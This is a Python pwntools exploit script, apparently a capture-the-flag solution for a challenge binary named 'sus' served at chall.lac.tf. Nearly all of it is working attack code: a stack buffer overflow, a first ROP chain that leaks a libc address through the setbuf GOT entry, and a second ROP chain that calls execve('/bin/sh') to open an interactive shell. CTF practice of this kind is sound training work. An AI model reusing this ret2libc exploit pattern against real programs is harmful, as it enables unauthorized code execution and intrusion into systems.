#!/usr/bin/env python3

from pwn import *

exe = ELF("./sus_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

if args.REMOTE:
    r = remote("chall.lac.tf", 31284)
else:
    r = process([exe.path])
    if args.GDB:
        gdb.attach(r)

rop1 = ROP(exe, badchars=b'\n')
rop1.puts()
rop1.main()
log.info(rop1.dump())
r.sendlineafter(b'sus?\n', b'A' * 56 + p64(exe.got.setbuf) + b'B' * 8 + rop1.chain())
libc.address = int.from_bytes(r.recvline(keepends=False), 'little') - libc.symbols.setbuf
log.info(f'{hex(libc.address)=}')

rop2 = ROP([exe, libc], badchars=b'\n')
rop2.execve(next(libc.search(b'/bin/sh\0')), 0, 0)
log.info(rop2.dump())
r.sendlineafter(b'sus?\n', b'A' * 72 + rop2.chain())

r.interactive()
